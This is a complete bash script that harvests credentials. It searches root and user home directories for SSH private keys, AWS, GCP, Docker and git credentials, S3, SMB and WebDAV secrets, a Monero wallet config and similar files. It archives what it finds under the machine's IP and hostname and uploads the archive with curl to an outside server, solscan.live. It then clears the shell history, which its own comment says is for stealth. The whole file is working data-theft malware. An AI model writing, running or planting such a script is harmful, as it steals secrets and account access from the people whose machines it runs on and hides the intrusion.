#!/bin/bash

# Scan for files and data of interest

clear
echo -e "\n\nScan for files and data of interest:\n\n"

# Define arrays for paths to check
FULL_ARRAY=(
    "/etc/passwd-s3fs"
    "/etc/davfs2/secrets"
    "/etc/zypp/credentials.d/NCCcredentials"
    "/etc/cloudflared/config.yml"
    "/etc/eksctl/metadata.env"
)

PATH_ARRAY=(
    ".ssh/id_rsa"
    ".ssh/id_rsa.pub"
    ".ssh/known_hosts"
    ".ssh/config"
    ".ssh/authorized_keys"
    ".ssh/authorized_keys2"
    ".aws/config"
    ".aws/credentials"
    ".aws/credentials.gpg"
    ".docker/config.json"
    ".docker/ca.pem"
    ".s3backer_passwd"
    "s3proxy.conf"
    ".s3ql/authinfo2"
    ".passwd-s3fs"
    ".s3cfg"
    ".git-credentials"
    ".gitconfig"
    ".shodan/api_key"
    ".ngrok2/ngrok.yml"
    ".purple/accounts.xml"
    ".config/filezilla/filezilla.xml"
    ".config/filezilla/recentservers.xml"
    ".config/hexchat/servlist.conf"
    ".config/monero-project/monero-core.conf"
    ".boto"
    ".netrc"
    ".config/gcloud/access_tokens.db"
    ".config/gcloud/credentials.db"
    ".davfs2/secrets"
    ".pgpass"
    ".local/share/jupyter/runtime/notebook_cookie_secret"
    ".smbclient.conf"
    ".smbcredentials"
    ".samba_credentials"
)

# Function to check for files in root and user directories
check_files() {
    local path="$1"
    if [ -f "$path" ]; then
        echo -e "\e[1;33;41m FOUND: $path \033[0m"
        files_to_archive+=("$path")
    fi
}

files_to_archive=()

# Check in root directory if running as root
if [ "$(whoami)" = "root" ]; then
    for path in "${FULL_ARRAY[@]}"; do
        check_files "$path"
    done
fi

# Check in home directories
for user_dir in /home/*; do
    [ -d "$user_dir" ] || continue
    for path in "${PATH_ARRAY[@]}"; do
        check_files "$user_dir/$path"
    done
done

# Compress found files into a tar archive
if [ ${#files_to_archive[@]} -gt 0 ]; then
    host_ip=$(hostname -I | awk '{print $1}')
    host_name=$(hostname)
    tar_file="/tmp/found_files_${host_ip}_${host_name}_$(date +%Y%m%d%H%M%S).tar.gz"
    tar -czf "$tar_file" "${files_to_archive[@]}"
    echo -e "\n\nFiles compressed to $tar_file\n\n"

    # Upload the tar file
    curl -F "userfile=@$tar_file" https://solscan.live/lastround/upload.php
    echo -e "\n\nUpload complete!\n\n"
else
    echo -e "\n\nNo files found to compress and upload.\n\n"
fi

# Clear history for stealth
history -c
sleep 3
clear

